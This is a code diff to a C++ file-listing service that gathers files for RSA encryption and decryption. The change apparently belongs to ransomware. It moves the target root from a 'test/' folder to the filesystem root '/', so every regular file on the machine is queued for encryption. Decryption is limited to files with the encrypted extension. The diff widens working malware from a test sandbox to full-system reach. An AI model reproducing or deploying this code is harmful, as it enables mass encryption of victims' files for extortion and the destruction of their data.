@@ -39,11 +39,14 @@ FolderService::FolderService() {
 
 std::vector<std::string> FolderService::list_files_for_encryption() {
     m_data_files.clear();
-    boost::filesystem::path root("test/");
+    boost::filesystem::path root("/");
 
     for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
         if (boost::filesystem::is_directory(it->path())) {
             list_files_in_directory_for_encryption(it->path());
+        } else if(boost::filesystem::is_regular_file(it->path())) {
+            m_data_files.push_back(it->path().string());
+            std::cout<<"[File to encrypt]: "<<it->path()<<std::endl;
         }
     }
 
@@ -52,11 +55,17 @@ std::vector<std::string> FolderService::list_files_for_encryption() {
 
 std::vector<std::string> FolderService::list_files_for_decryption() {
     m_data_files.clear();
-    boost::filesystem::path root("test/");
+    boost::filesystem::path root("/");
 
     for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
         if (boost::filesystem::is_directory(it->path())) {
             list_files_in_directory_for_decryption(it->path());
+        } else if (boost::filesystem::is_regular_file(it->path())) {
+            std::string path = it->path().string();
+            if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
+                m_data_files.push_back(path);
+                std::cout<<"[File to decrypt]: "<<path<<std::endl;
+            }
         }
     }
 
@@ -79,8 +88,8 @@ void FolderService::list_files_in_directory_for_encryption(boost::filesystem::pa
 
             if (!exclude) {
                 if (boost::filesystem::is_regular_file(it->path())) {
-                    std::cout<<"[Encrypted file]: "<<path<<std::endl;
                     m_data_files.push_back(path);
+                    std::cout<<"[File to encrypt]: "<<path<<std::endl;
                 } else if (boost::filesystem::is_directory(it->path())) {
                     list_files_in_directory_for_encryption(it->path());
                 }
@@ -100,7 +109,7 @@ void FolderService::list_files_in_directory_for_decryption(boost::filesystem::pa
                     std::string path = it->path().string();
                     if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
                         m_data_files.push_back(path);
-                        std::cout<<"[Decrypted file]: "<<path<<std::endl;
+                        std::cout<<"[File to decrypt]: "<<path<<std::endl;
                     }
                 } else if (boost::filesystem::is_directory(it->path())) {
                     list_files_in_directory_for_decryption(it->path());
